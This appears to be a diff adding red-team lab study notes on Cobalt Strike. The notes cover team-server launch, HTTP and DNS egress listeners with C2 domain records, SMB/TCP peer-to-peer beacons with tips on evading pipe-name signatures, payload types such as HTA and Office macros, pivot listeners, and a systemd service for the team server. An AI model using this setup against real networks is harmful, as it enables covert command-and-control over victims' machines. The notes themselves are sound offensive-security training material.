@@ -1,0 +1,313 @@
+
+
+// 01 - Team Server Setup
+
+{{{ Cobalt Strike ================================================================
+- Raphael Mudge 2012
+- threat representative sec. tests
+- one of the FIRST public red team C2 frameworks 
+        - the GOTO for many businesses/consulting orgs
+
+in 2020 acquired by HelpSystems LLC.
+
+
+
+\\ start it (in lab, connect via SSH to attacker nix machine), then
+
+cd cobaltstrike/
+attacker@ubuntu ~/cobaltstrike> sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
+
+•	10.10.5.50 // is the IP address of the Attacker Linux VM.
+•	Passw0rd! // the shared password used to connect from the Cobalt Strike client.
+        - shared by everyone
+•	webbug.profile // is an example Malleable C2 profile (covered in more detail later).
+                - optional
+               - profiles vary on choice of C2 comms e.g. HTTP/HTTPS, DNS, SMB, *TCP
+
+\\ via windows attacker, run CobaltStrike app 
+- alias: anything 
+- host: hosting cobalt/teamserver 
+- user: anything (shows to others)
+- passwd: shared teamserver passwd
+
+
+
+===================================================================}}}
+
+// 02 - Listeners 
+
+{{{ EGRESS LISTENERS  ================================================================
+- egress listener: allows Beacon to comm outside of target network to the team server... duh
+
+//defaults: HTTP/S and DNS
+        - how beacon encapsulates C2 traffic 
+        
+{{{ HTTP egress listener ================================================================
+// C2 over HTTP POST/GET requests 
+
+\\ CobaltStrike->Listeners->+ (add)
+
+-> name: http1              
+-> Payload: Beacon HTTP
+-> HTTP Hosts: host server (defaults IP, but use domain = more realistic)
+         can use multiple domain names, as long as all point to listening server
+        \\ nickelviper.com     
+         *** create & use own later w/PowerDNS (DNS resolver)
+         \\ thecave.com pointing to 10.10.5.50
+-> HTTP Host(Stager) = nickelviper.com     
+save 
+
+// confirm on nix/teamserver 
+sudo ss -lntp
+
+===================================================================}}}
+
+{{{ DNS egress listener ================================================================
+// send/receive C2 over DNS loop/response types: A, AAAA and TXT 
+        - TXT = default, can hold most amount of data 
+        \\ requirement: must create one or more DNS records for a domain the team server is authoritatie for 
+        \\ e.g. for nickelviper.com 
+        
+Name	Type	Data
+@	A	10.10.5.50
+ns1	A	10.10.5.50
+pics	NS	ns1.nickelviper.com.
+
+// now DNS beacon will perform lookup requests (e.g. <c2data>.pics.nickelviper.com), routed over Internet's DNS infrax 
+- will reach OUR TEAMSERVER bc - have setup appropriate records saying DNS server nsl.nickelviper.com = authoritative for pics subdomain
+
+
+\\ CobaltStrike->Listeners->+ (add)
+--> Name: dns1
+--> DNS host: pics.nickelviper.com
+--> DNS Host (stager): pics.nickelviper.com
+
+save 
+
+// confirm w/an arbitrary lookup 
+dig @ns1.nickelviper.com test.pics.nickelviper.com +short 
+        \\ ^^^ CONFIRM THIS
+
+
+
+===================================================================}}}
+
+
+===================================================================}}}
+
+
+{{{ PEER TO PEER LISTENERS ================================================================
+// Peer-to-peer (P2P) listeners differ from egress listeners because they don't communicate with the team server directly.  Instead, P2P listeners are designed to chain multiple Beacons together in parent/child relationships.  The primary reasons for doing this are:
+        1.	To reduce the number of hosts talking out to your team server, as the higher the traffic volume, the more likely it is to get spotted.
+        2.	To run Beacon on machines that can't even talk out of the network, e.g. in cases of firewall rules and other network segregations.
+
+
+// 2 types: SMB and raw TCP. CHILD/P2P beacons -> PARENT EGRESS beacons!
+        - they do NOT leave tgt network, e.g. teamserver wonlt listen on 445 smb 
+        - a child SMB/TCP beacon will be linked to an EGRESS HTTP/DNS beacon 
+
+
+{{{ SMB ================================================================
+
+-> Pipename (C2) ((named pipe) : msagent_55 // pretty well signatured 
+        -> OPSEC: emulate names know to be used by common apps or Windows 
+
+// list currently listening pipes for inspiration 
+PS C:\> ls \\.\pipe\
+        so 
+        ls \\.\pipe\ 
+
+Pipename(C2): TSVCPIPE-7db13c37-3a5c-48e5-87d2-cdbdd92ec621
+
+===================================================================}}}
+
+{{{ TCP ================================================================
+// will bind and listen on specified port num. can specify only localhost, but default is 0.0.0.0
+
+- choose name, listening port
+- set listen interfaces: local or defaukt 0.0.0.0
+
+===================================================================}}}
+
+
+
+===================================================================}}}
+
+
+{{{ PowerDNS ================================================================
+admin
+admin
+
+// create own domain 
+domain name  & extension - thecave.gub
+
+Name	Type	Status	TTL	Data	Comment	Edit	Delete	Changelog
+@	A	Active	60	10.10.5.50	points to root/ actually translates domain to 10.10.5.50	
+ns0	A	Active	60	10.10.5.50	nameserver. resolves back to the 10.10.5.50	
+traps	NS	Active	60	ns0.thecave.gub	traps subdomain, NS record points to the ns0 nameserver. ns0.thecave.gub is authoritative for this subdomain.
+
+
+- machines in lab must have PowerDNS configured as DNSresolver
+
+===================================================================}}}
+
+// 03 - Generating Payloads
+
+{{{ types of Payloads / payload gen ================================================================
+\\HTML Application
+
+Produces a .hta file (typically delivered through a browser by way of social engineering) uses embedded VBScript to run the payload.  Only generates payloads for egress listeners and is limited to x86.
+
+\\MS Office Macro
+
+Produces a piece of VBA that can be dropped into a macro-enabled MS Word or Excel document.  Only generates payloads for egress listeners but is compatible with both x86 and x64 Office.
+
+\\Stager Payload Generator
+
+Produces a payload stager in a variety of languages including C, C#, PowerShell, Python, and VBA.  These are useful when building your own custom payloads or exploits.  Only generates payloads for egress listeners, but supports x86 and x64.
+
+\\Stageless Payload Generator
+
+As above, but generates stageless payloads rather than stagers.  It has slightly fewer output formats, e.g. no PowerShell, but has the added option of specifying an exit function (process or thread).  It can also generate payloads for P2P listeners.
+
+\\Windows Stager Payload
+
+Produces a pre-compiled stager as an EXE, Service EXE or DLL.
+
+\\Windows Stageless Payload
+
+Produces a pre-compiled stageless payload as an EXE, Service EXE, DLL, shellcode, as well as PowerShell.  This is also the only means of generating payloads for P2P listeners.
+
+\\Windows Stageless Generate All Payloads
+
+Pretty much what it says on the tin.  Produces every stageless payload variant, for every listener, in x86 and x64.
+
+
+// easy ALL PAYLOAD gen all types - cobaltstrike
+Payloads->Windows Stageless Generate All Payloads
+
+===================================================================}}}
+
+// 04 - Beacons
+
+{{{ basic Beacon shell comms================================================================
+
+// learn beacon commands 
+help 
+help <command>
+
+again
+- egress = http/dns traffic. connects to team server
+- P2P = tcp,smb. connects to an egress. good for restricted devices (e.g. firewalls)
+
+===================================================================}}}
+
+{{{ EGRESS http/DNS ================================================================
+    \\ EGRESS - http_x64.exe
+
+        // sleep
+        - how frequent Beacon checks in with server 
+        - default 60s 
+        - checks in, downloads job, executes!
+
+        // change beacon timer 
+        sleep 5 \\ seconds 
+        - BAD OPSEC
+        - but in lab... time is money
+
+
+        // (pseudo) 'interactive' mode
+        sleep 0
+        - reaches out immediately
+
+# DNS beacon
+        - does NOT populate metadata - low bandwidth of DNS 
+        - must run:
+
+        checkin
+
+        ===================================================================}}}
+
+{{{ P2P ================================================================
+\\P2P - tcp-local_x64.exe
+- running will not show in cobalt strike window OR netstat
+- once beacon is executed, will only show LISTENING in netstat!
+// basically, running it on machine opens a TCP listener... awaits egress beacon to connect to it
+
+// how to connect to P2P? WITHIN EGRESS/PARENT BEACON SHELL!
+connect \\ TCP
+help connect 
+connect localhost 4444
+
+link \\ SMB
+
+ctrl+k // clear console 
+exit // disconnect beacon
+remove // remove it from view 
+
+====================================================}}}
+
+// 05 - Pivot Listeners
+{{{================================================================
+
+Pivot listener = compromised tgt as REDIRECTOR for other Beacon sessions
+        - payloads generated from the listener: reverse-tcp beacons // so egress doesn't need to BIND INTO P2P!!! 
+
+\\ egress<---child beacon
+
+// within an EXISTING *egress beacon
+- right click->pivoting->listener
+- default Listen options: typically default knows where to redirect back to
+
+beacon> run nestat -anop tcp  // show conns, can confirm 
+- beacon listening on 4444, waiting to redirect back
+
+// can NOW generate payloads for this listener 
+- payloads -> listener -> newly created pivot listener 
+
+
+# idk 
+spawn pivot1
+
+===================================================================}}}
+
+// 06 - Running team server as a service
+
+
+// run Teams server as on boot service! no more SSH every time -.-
+
+{{{ teamserver.service ================================================================
+
+\\ create unit file 
+sudo vim /etc/systemd/system/teamserver.service
+
+\\ unit file 
+[Unit]
+Description=Cobalt Strike Team Server
+After=network.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=1
+User=root
+WorkingDirectory=/home/attacker/cobaltstrike
+ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
+
+[Install]
+WantedBy=multi-user.target
+
+
+\\ reload systemd
+sudo systemctl daemon-reload
+        sudo systemctl status teamserver.service 
+sudo systemctl start teamserver.service 
+
+\\ start on boot 
+sudo systemctl enable teamserver.service
+
+
+
+convenient! only need to create listeners once, then boot the device (attacker.linux lab VM)
+===================================================================}}}
